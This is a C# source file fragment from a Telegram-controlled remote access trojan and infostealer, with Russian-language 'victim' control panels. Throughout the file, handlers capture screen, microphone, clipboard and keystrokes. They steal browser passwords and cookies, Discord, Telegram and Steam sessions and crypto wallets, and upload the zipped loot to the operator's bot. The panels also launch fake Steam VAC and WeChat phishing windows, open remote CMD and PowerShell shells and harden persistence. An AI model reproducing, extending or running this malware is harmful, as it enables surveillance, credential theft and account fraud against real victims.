            await _botClient.SendTextMessageAsync(chatId, GetRichText("🎥 <i>Recording screen (10s)...</i>"), parseMode: ParseMode.Html);
            string? path = await VideoModule.RecordScreen(10);
            if (path != null)
            {
                using var stream = File.OpenRead(path);
                await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, $"{ConfigManager.VictimName}_Screen.zip"), caption: GetRichText("🎥 Screen recording sequence"));
                File.Delete(path);
            }
            else await _botClient.SendTextMessageAsync(chatId, GetRichText("❌ Video recording failed."), parseMode: ParseMode.Html);
        }

        private async Task HandleClipboard(long chatId)
        {
            string text = ClipboardModule.GetClipboardText();
            if (!string.IsNullOrEmpty(text))
                await _botClient.SendTextMessageAsync(chatId, GetRichText($"📋 <b>Clipboard:</b>\n<code>{WebUtility.HtmlEncode(text)}</code>"), parseMode: ParseMode.Html);
            else await _botClient.SendTextMessageAsync(chatId, GetRichText("❌ Clipboard is empty."), parseMode: ParseMode.Html);
        }

        private async Task HandleClipboardSummary(long chatId)
        {
            string summary = ClipboardModule.GetSummary();
            await _botClient.SendTextMessageAsync(chatId, GetRichText($"📋 <b>Clipboard Summary:</b>\n\n{summary}"), parseMode: ParseMode.Html);
        }
        
        private async Task HandleKeylogGet(long chatId)
        {
             string logFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_keys.log");
             if (File.Exists(logFile))
             {
                 await _botClient.SendTextMessageAsync(chatId, GetRichText("⌨️ <i>Uploading keylogs...</i>"), parseMode: ParseMode.Html);
                 string outName = $"{ConfigManager.VictimName}_Keys.txt";
                 using var stream = File.OpenRead(logFile);
                 await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, outName), caption: GetRichText("⌨️ <b>Remote Keylogs Captured</b>"), parseMode: ParseMode.Html);
             }
             else await _botClient.SendTextMessageAsync(chatId, GetRichText("❌ <b>ERROR:</b> No keylogs found yet."), parseMode: ParseMode.Html);
        }

        private async Task HandleSystemInfo(long chatId)
        {
            string info = SystemInfoModule.GetSystemInfo();
            await _botClient.SendTextMessageAsync(chatId, GetRichText(info), parseMode: ParseMode.Markdown);
        }

        private async Task HandleWifiProfiles(long chatId)
        {
            string res = await ShellManager.ExecuteCommand("netsh wlan show profiles");
            await _botClient.SendTextMessageAsync(chatId, GetRichText($"📶 <b>WiFi Profiles:</b>\n<pre>{WebUtility.HtmlEncode(res)}</pre>"), parseMode: ParseMode.Html);
        }

        private async Task HandleWindowHistory(long chatId)
        {
             await _botClient.SendTextMessageAsync(chatId, GetRichText("📜 <i>Feature pending implementation in native module.</i>"), parseMode: ParseMode.Html);
        }

        private async Task HandleDiscordSteal(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, GetRichText("💬 <b>SCANNING:</b> <i>Discord environment artifacts...</i>"), parseMode: ParseMode.Html);
            var service = new ChatService();
            string report = await service.Run();
            await _botClient.SendTextMessageAsync(chatId, GetRichText(report), parseMode: ParseMode.Html);
        }

        private async Task HandleBrowserSteal(long chatId)
        {
            var msg = await _botClient.SendTextMessageAsync(chatId, GetRichText("🌍 <b>SCANNING hosts...</b> <i>(Chrome, Edge, Opera, etc)</i>"), parseMode: ParseMode.Html);
            var service = new Microsoft.UpdateService.Modules.DataService();
            var result = await service.RunCompleteSteal();
            
            if (result.Success && !string.IsNullOrEmpty(result.OutputDir))
            {
                string successMsg = $"🔓 <b>Browser Data Captured!</b>\n" +
                                    $"━━━━━━━━━━━━━━━━━━\n" +
                                    $"{result.Message}\n" +
                                    $"━━━━━━━━━━━━━━━━━━\n";

                await _botClient.EditMessageTextAsync(chatId, msg.MessageId, GetRichText(successMsg), parseMode: ParseMode.Html);
                await _botClient.SendTextMessageAsync(chatId, GetRichText("🛰️ <b>ZIPPING:</b> <i>Preparing consolidated archive...</i>"), parseMode: ParseMode.Html);
                
                string uniqueId = Guid.NewGuid().ToString("N").Substring(0, 6);
                string zipName = $"{ConfigManager.VictimName}_{uniqueId}_Browsers.zip";
                string zipPath = Path.Combine(Path.GetTempPath(), zipName);
                
                try
                {
                    if (File.Exists(zipPath)) File.Delete(zipPath);
                    ZipFile.CreateFromDirectory(result.OutputDir, zipPath);
                    
                    using (var stream = new FileStream(zipPath, FileMode.Open, FileAccess.Read, FileShare.Read))
                    {
                        await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, zipName), caption: GetRichText("🔓 <b>CONSOLIDATED LOGS</b>\n🍪 Total Cookies: " + result.CookieCount + "\n🔑 Total Passwords: " + result.PasswordCount), parseMode: ParseMode.Html);
                    }
                    
                    try { File.Delete(zipPath); } catch { }
                    await _botClient.SendTextMessageAsync(chatId, GetRichText("✅ <b>SUCCESS:</b> Browser data uploaded."), parseMode: ParseMode.Html);
                }
                catch (Exception ex)
                {
                    await _botClient.SendTextMessageAsync(chatId, GetRichText($"❌ <b>ZIP Error:</b> <code>{ex.Message}</code>"), parseMode: ParseMode.Html);
                }
            }
            else
            {
                await _botClient.EditMessageTextAsync(chatId, msg.MessageId, GetRichText(result.Message), parseMode: ParseMode.Html);
            }
        }

        private async Task HandleCryptoSteal(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, GetRichText("💰 <b>SCANNING:</b> <i>Crypto-wallet signatures...</i>"), parseMode: ParseMode.Html);
            var service = new CryptoService();
            string report = await service.Run(Path.GetTempPath());
            await _botClient.SendTextMessageAsync(chatId, GetRichText(report), parseMode: ParseMode.Html);
        }

        private async Task HandleTelegramSteal(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, GetRichText("✈️ <b>SCANNING:</b> <i>Telegram Desktop sessions...</i>"), parseMode: ParseMode.Html);
            var service = new MessengerService();
            string result = service.Run();
            if (result.StartsWith("❌")) await _botClient.SendTextMessageAsync(chatId, GetRichText(result));
            else
            {
                string zipName = $"{ConfigManager.VictimName}_Telegram.zip";
                string zipPath = Path.Combine(Path.GetTempPath(), zipName);
                if (File.Exists(zipPath)) File.Delete(zipPath);
                ZipFile.CreateFromDirectory(result, zipPath);
                
                using (var stream = File.OpenRead(zipPath)) 
                    await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, zipName), caption: GetRichText("🔓 <b>TG Data Captured</b>"), parseMode: ParseMode.Html);
                
                File.Delete(zipPath);
                Directory.Delete(result, true);
                await _botClient.SendTextMessageAsync(chatId, GetRichText("✅ <b>SUCCESS:</b> Telegram session uploaded."), parseMode: ParseMode.Html);
            }
        }

        private async Task HandleFullReport(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, GetRichText("🚀 <b>GENERATING:</b> <i>Building comprehensive full report...</i>"), parseMode: ParseMode.Html);
            string? zipPath = await ReportManager.CreateFullReport();
            if (zipPath != null)
            {
                string timestamp = DateTime.Now.ToString("HHmmss");
                string zipName = $"{ConfigManager.VictimName}_FullReport_{timestamp}.zip";
                string newZipPath = Path.Combine(Path.GetTempPath(), zipName);
                
                try 
                {
                    if (File.Exists(newZipPath)) File.Delete(newZipPath);
                    File.Move(zipPath, newZipPath);

                    using (var stream = new FileStream(newZipPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    {
                        await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, zipName), caption: GetRichText("📦 <b>Vanguard Full Report Locked</b>"), parseMode: ParseMode.Html);
                    }
                    
                    // Delay cleanup to ensure file handles are released
                    _ = Task.Run(async () => { await Task.Delay(2000); try { File.Delete(newZipPath); } catch { } });
                    await _botClient.SendTextMessageAsync(chatId, GetRichText("✅ <b>SUCCESS:</b> Full report finalized."), parseMode: ParseMode.Html);
                }
                catch (Exception ex)
                {
                    Log($"[REPORT ERROR] {ex.Message}");
                    await _botClient.SendTextMessageAsync(chatId, GetRichText($"❌ <b>FILE ERROR:</b> <code>{WebUtility.HtmlEncode(ex.Message)}</code>"), parseMode: ParseMode.Html);
                }
            }
            else await _botClient.SendTextMessageAsync(chatId, GetRichText("❌ <b>ERROR:</b> Report generation failed."), parseMode: ParseMode.Html);
        }

        private async Task HandleSteamSteal(long chatId)
        {
            var msg = await _botClient.SendTextMessageAsync(chatId, GetRichText("💎 <b>STEAM SESSION STEALER</b>\n━━━━━━━━━━━━━━━━━━\n🚀 <i>Инициализация процесса...</i>"), parseMode: ParseMode.Html);
            
            try
            {
                var result = await SteamStealer.RunSteal(async (progress) => {
                    try { await _botClient.EditMessageTextAsync(chatId, msg.MessageId, GetRichText(progress), parseMode: ParseMode.Html); } catch { }
                });

                if (result.Error != null)
                {
                    await _botClient.EditMessageTextAsync(chatId, msg.MessageId, GetRichText($"❌ <b>ОШИБКА:</b> <code>{result.Error}</code>"), parseMode: ParseMode.Html);
                    return;
                }

                if (result.ZipPath != null && File.Exists(result.ZipPath))
                {
                    string info = $"✅ <b>СЕССИЯ STEAM ИЗВЛЕЧЕНА</b>\n" +
                                  $"━━━━━━━━━━━━━━━━━━\n" +
                                  $"🔑 <b>SSFN Файлы:</b> <code>{result.SsfnCount}</code>\n" +
                                  $"🍪 <b>Config:</b> {(result.ConfigFound ? "🟢 Найдено" : "🔴 Отсутствует")}\n" +
                                  $"━━━━━━━━━━━━━━━━━━\n" +
                                  $"📦 <i>Отправка архива...</i>";

                    await _botClient.EditMessageTextAsync(chatId, msg.MessageId, GetRichText(info), parseMode: ParseMode.Html);
                    
                    using (var stream = File.OpenRead(result.ZipPath))
                    {
                        await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, Path.GetFileName(result.ZipPath)), caption: GetRichText("💎 <b>Steam Session Package (SSFN/Config)</b>"), parseMode: ParseMode.Html);
                    }
                    
                    File.Delete(result.ZipPath);
                }
            }
            catch (Exception ex)
            {
                await _botClient.SendTextMessageAsync(chatId, GetRichText($"❌ <b>CRITICAL ERROR:</b> <code>{ex.Message}</code>"), parseMode: ParseMode.Html);
            }
        }

        private async Task ShowAdminPanel(long chatId, int messageId = 0)
        {
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("💻 SYSTEM", "panel_system"),
                    InlineKeyboardButton.WithCallbackData("💼 WORK", "panel_work")
                },
                new[] { InlineKeyboardButton.WithCallbackData("🕵️‍♂️ SPYWARE", "panel_spyware") },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("👥 СЕССИИ", "sessions_list"),
                    InlineKeyboardButton.WithCallbackData("📊 ПОЛНЫЙ ОТЧЕТ", "full_report")
                },
                new[] { InlineKeyboardButton.WithCallbackData("♻️ СБРОС ЦЕЛИ", "session_reset") },
                new[] { InlineKeyboardButton.WithCallbackData("✍️ ИМЯ ЖЕРТВЫ", "set_victim_name") }
            });

            string status = _targetVictimId == null ? "🌐 ГЛОБАЛЬНЫЙ" : $"🎯 {(_targetVictimId == ConfigManager.VictimName ? "АКТИВЕН" : "ОЖИДАНИЕ")}";
            string info = $"💎 <b>EmoCore</b>\n" +
                          $"━━━━━━━━━━━━━━━━━━\n" +
                          $"👤 <b>Жертва:</b> <code>{ConfigManager.VictimName}</code>\n" +
                          $"📍 <b>Режим:</b> <code>{status}</code>\n" +
                          $"⚡ <b>Права:</b> {(ElevationService.IsAdmin() ? "🟢 Админ" : "Юзер")}\n" +
                          $"🌐 <b>IP:</b> <code>{SystemInfoModule.GetExternalIP()}</code>\n" +
                          $"━━━━━━━━━━━━━━━━━━";

            await EditOrSend(chatId, messageId, info, markup);
        }

        private async Task ShowSystemPanel(long chatId, int messageId)
        {
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[] { InlineKeyboardButton.WithCallbackData("📂 ФАЙЛ-МЕНЕДЖЕР", "file_manager") },
                new[] { 
                    InlineKeyboardButton.WithCallbackData(_userState.TryGetValue(chatId, out string s) && s == "shell_cmd_mode" ? "🐚 CMD 🟢" : "🐚 CMD 🔴", "shell_cmd"), 
                    InlineKeyboardButton.WithCallbackData(_userState.TryGetValue(chatId, out string s2) && s2 == "shell_ps_mode" ? "📜 PS 🟢" : "📜 PS 🔴", "shell_ps") 
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("⚙️ ИНФО", "system_info"),
                    InlineKeyboardButton.WithCallbackData("📶 ПРОЦЕССЫ", "proc_list")
                },
                new[] { InlineKeyboardButton.WithCallbackData(ProxyModule.IsActive ? "🌐 ПРОКСИ 🟢" : "🌐 ПРОКСИ 🔴", "proxy_toggle") },
                new[] { InlineKeyboardButton.WithCallbackData("🛡️ УСИЛИТЬ ЗАКРЕП", "harden_persistence") },
                new[] { InlineKeyboardButton.WithCallbackData("💀 CRITICAL MODE", "critical_toggle") },
                new[] { InlineKeyboardButton.WithCallbackData("👁️ АКТИВИРОВАТЬ СТРАЖА", "activate_guardian") },
                new[] { InlineKeyboardButton.WithCallbackData("🔙 НАЗАД", "back_to_main") }
            });

            await EditOrSend(chatId, messageId, "💻 <b>СИСТЕМНАЯ ПАНЕЛЬ</b>\n━━━━━━━━━━━━━━━━━━\nУправление файлами и процессами:", markup);
        }

        private async Task ShowWorkPanel(long chatId, int messageId)
        {
            string steamStatus = Modules.PhishManager.GlobalBlockSteam ? "🔒 LOCKED" : "🔓 UNLOCKED";
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🚀 VAC АЛЕРТ", "vac_panel"),
                    InlineKeyboardButton.WithCallbackData("🚀 STEAM ФИШИНГ", "work_steam_phish")
                },
                new[] { InlineKeyboardButton.WithCallbackData($"🚫 STEAM БЛОК: {steamStatus}", "toggle_steam_block") },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("💬 DISCORD", "work_discord"),
                    InlineKeyboardButton.WithCallbackData("✈️ TELEGRAM", "work_telegram")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🌍 БРАУЗЕРЫ", "work_browsers"),
                    InlineKeyboardButton.WithCallbackData("🚀 WECHAT ФИШИНГ", "work_wechat_phish")
                },
                new[] { InlineKeyboardButton.WithCallbackData("💎 STEAM SSFN", "work_steam_ssfn") },
                new[] { InlineKeyboardButton.WithCallbackData("💰 КРИПТО", "work_crypto") },
                new[] { InlineKeyboardButton.WithCallbackData("🔙 НАЗАД", "back_to_main") }
            });

            await EditOrSend(chatId, messageId, "💼 <b>РАБОЧАЯ ПАНЕЛЬ</b>\nЗапуск фишинга или сбор данных:", markup);
        }

        private async Task ShowVacPanel(long chatId, int messageId)
        {
            string lang = PhishManager.GetVacLang();
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[] { InlineKeyboardButton.WithCallbackData("🚀 ЗАПУСТИТЬ ОКНО VAC", "vac_launch") },
                new[] { InlineKeyboardButton.WithCallbackData(PhishManager.GlobalBlockSteam ? "🛡 БЛОК STEAM [ВКЛ]" : "🛡 БЛОК STEAM [ВЫКЛ]", "vac_toggle_block") },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData(lang == "en" ? "🇺🇸 ENGLISH" : "🇨🇳 CHINESE", "vac_toggle_lang"),
                    InlineKeyboardButton.WithCallbackData("🕵️ ИМЯ АГЕНТА", "vac_set_agent")
                },
                new[] { InlineKeyboardButton.WithCallbackData("🍪 ИНЖЕКТ КУКОВ", "vac_inject_cookies") },
                new[] { InlineKeyboardButton.WithCallbackData("🔙 НАЗАД", "panel_work") }
            });

            string info = "🚨 <b>НАСТРОЙКА VAC ALERT</b>\n" +
                          "━━━━━━━━━━━━━━━━━━\n" +
                          $"🕵️ <b>Агент:</b> <code>{PhishManager.GetAgentName()}</code>\n" +
                          $"🌐 <b>Язык:</b> {(lang == "en" ? "🇺🇸 EN" : "🇨🇳 CN")}\n" +
                          "━━━━━━━━━━━━━━━━━━";

            await EditOrSend(chatId, messageId, info, markup);
        }

        private async Task HandleVacLaunch(long chatId)
        {
            try
            {
                PhishManager.LaunchSteamAlert();
                await _botClient.SendTextMessageAsync(chatId, GetRichText("🚀 <b>SUCCESS:</b> VAC Alert Engine launched."), parseMode: ParseMode.Html);
            }
            catch (Exception ex)
            {
                await _botClient.SendTextMessageAsync(chatId, GetRichText($"❌ <b>ERROR:</b> Launch failed: <code>{ex.Message}</code>"), parseMode: ParseMode.Html);
            }
        }

        private async Task ShowSteamPhishLangPanel(long chatId, int messageId)
        {
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🇺🇸 ENGLISH", "steam_phish_en"),
                    InlineKeyboardButton.WithCallbackData("🇨🇳 CHINESE", "steam_phish_cn")
                },
                new[] { InlineKeyboardButton.WithCallbackData("🔙 НАЗАД", "panel_work") }
            });

            await EditOrSend(chatId, messageId, "🎣 <b>STEAM ФИШИНГ</b>\n\n<b>Выбери язык окна:</b>", markup);
        }

        private async Task ShowSpywarePanel(long chatId, int messageId)
        {
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("📸 СКРИНШОТ", "screenshot"),
                    InlineKeyboardButton.WithCallbackData("⌨️ ЛОГИ КЛАВИШ", "keylog_get")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("📋 БУФЕР", "clipboard"),
                   InlineKeyboardButton.WithCallbackData("📄 ИСТОРИЯ (TXT)", "clipboard_get_file")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🎤 МИКРО (10с)", "record_audio"),
                    InlineKeyboardButton.WithCallbackData("🎥 ЗАПИСЬ ЭКРАНА (10с)", "record_video")
                },
                _discordReady ? 
                    new[] { InlineKeyboardButton.WithCallbackData("🔴 ВЫКЛЮЧИТЬ DISCORD", "discord_ctrl_disconnect") } :
                    new[] { InlineKeyboardButton.WithCallbackData("🕹️ DISCORD (ПОДКЛЮЧИТЬ)", "discord_remote_start") },
                
                _discordReady ? 
                    new[]
                    {
                        InlineKeyboardButton.WithCallbackData("🎙️ МИК", "discord_ctrl_mic"),
                        InlineKeyboardButton.WithCallbackData("🔇 УШИ", "discord_ctrl_deaf"),
                        InlineKeyboardButton.WithCallbackData("🖥 ДЕМКА", "discord_ctrl_stream")
                    } : 
                    new InlineKeyboardButton[0],

                new[] { InlineKeyboardButton.WithCallbackData("🔙 НАЗАД", "back_to_main") }
            });

            await EditOrSend(chatId, messageId, "👁️ <b>ШПИОНАЖ</b>\n━━━━━━━━━━━━━━━━━━\nСкрытая запись и Discord Remote:", markup);
        }

        private async Task ShowHelp(long chatId)
        {
            string help = "🆘 <b>Available commands:</b>\n\n/panel - Open admin panel\n/help - Show this help";
            await _botClient.SendTextMessageAsync(chatId, help, parseMode: ParseMode.Html);
        }

        private string GetRichText(string text)
        {
            if (string.IsNullOrEmpty(text)) return "";
            string footer = $"\n\n━━━━━━━━━━━━━━━━━━\n👤 <b>Session:</b> <code>{ConfigManager.VictimName}</code>";
            if (text.Contains(footer)) return text;
            return text + footer;
        }

        private async Task EditOrSend(long chatId, int messageId, string text, InlineKeyboardMarkup markup, ParseMode parseMode = ParseMode.Html)
        {
            string richText = GetRichText(text);
            try { await _botClient.EditMessageTextAsync(chatId, messageId, richText, parseMode: parseMode, replyMarkup: markup); }
            catch { await _botClient.SendTextMessageAsync(chatId, richText, parseMode: parseMode, replyMarkup: markup); }
        }

        private async Task SendWithRetry(Func<Task<TgMessage>> action)
        {
            try { await action(); } catch { }
        }
        private async Task<bool> CheckTarget(string callbackQueryId)
        {
            if (_targetVictimId != null && _targetVictimId != ConfigManager.VictimName)
            {
                // Silent ignore for non-targeted victims, but MUST answer callback
                await _botClient.AnswerCallbackQueryAsync(callbackQueryId);
                return false;
            }
            return true;
        }

        private async Task ShowSessionsPanel(long chatId, int messageId = 0)
        {
            var files = await GistManager.GetFiles();
            var buttons = new List<InlineKeyboardButton[]>();
            
            foreach (var file in files.Keys)
            {
                if (file.StartsWith("victim_") && file.EndsWith(".json"))
                {
                    string name = file.Replace("victim_", "").Replace(".json", "");
                    buttons.Add(new[] { InlineKeyboardButton.WithCallbackData($"👤 {name}", $"session_select_{name}") });
                }
            }
            buttons.Add(new[] { InlineKeyboardButton.WithCallbackData("🔙 BACK", "back_to_main") });

            var markup = new InlineKeyboardMarkup(buttons);
            await EditOrSend(chatId, messageId, "👥 <b>SESSION MANAGER</b>\nSelect a victim to control:", markup);
        }

    }
}
